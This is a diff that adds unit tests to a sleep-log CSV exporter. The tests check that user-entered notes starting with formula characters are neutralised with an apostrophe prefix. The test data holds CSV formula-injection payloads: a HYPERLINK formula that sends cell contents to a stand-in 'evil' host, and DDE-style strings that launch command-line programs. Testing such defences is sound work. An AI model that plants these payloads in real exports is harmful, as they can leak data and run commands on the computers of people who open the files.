@@ -81,6 +81,53 @@ describe('buildSleepCsv', () => {
     expect(line[21]).toBe('02:30');  // Durée jour
   });
 
+  it('neutralises CSV formula injection in user-controlled notes', () => {
+    // Each payload is something a malicious user might paste into the notes
+    // field. None of these should execute when the export is opened in
+    // Excel / LibreOffice / Google Sheets — they must be rendered as literal
+    // text. The fix prepends a single-quote which the spreadsheet consumes.
+    const payloads = [
+      '=HYPERLINK("http://evil/?x="&A1,"clique")',
+      '+1+cmd|"/c calc"!A1',
+      '-2+3+cmd|"/c notepad"!A1',
+      '@SUM(1+1)*cmd|"/c whoami"!A1',
+      '\tleading-tab-also-counts'
+    ];
+    for (const payload of payloads) {
+      const out = buildSleepCsv(
+        [{
+          date: '2025-07-15', wakeTime: '07:00',
+          nap1Start: null, nap1End: null, nap2Start: null, nap2End: null,
+          nap3Start: null, nap3End: null, nap4Start: null, nap4End: null,
+          bedtime: '20:00', notes: payload
+        }],
+        'X'
+      );
+      const line = out.split('\r\n')[1];
+      // Last column is Notes (col index 22). The first character of the cell
+      // value MUST be `'`. The cell itself may also be wrapped in quotes if
+      // it contains `;` / `"` / CR / LF — that's fine, we just need the
+      // apostrophe to appear right after the opening quote (if any).
+      const notesCell = line.split(';').pop() ?? '';
+      const firstContentChar = notesCell.startsWith('"') ? notesCell[1] : notesCell[0];
+      expect(firstContentChar).toBe("'");
+    }
+  });
+
+  it('does NOT prefix cells that legitimately start with a safe character', () => {
+    const out = buildSleepCsv(
+      [{
+        date: '2025-07-15', wakeTime: '07:00',
+        nap1Start: null, nap1End: null, nap2Start: null, nap2End: null,
+        nap3Start: null, nap3End: null, nap4Start: null, nap4End: null,
+        bedtime: '20:00', notes: 'Bonne nuit, rien à signaler.'
+      }],
+      'X'
+    );
+    const notesCell = out.split('\r\n')[1].split(';').pop();
+    expect(notesCell).toBe('Bonne nuit, rien à signaler.');
+  });
+
   it('subtracts pause minutes from per-nap durée and from Durée jour', () => {
     const rows = [{
       date: '2025-07-15', wakeTime: '07:00',
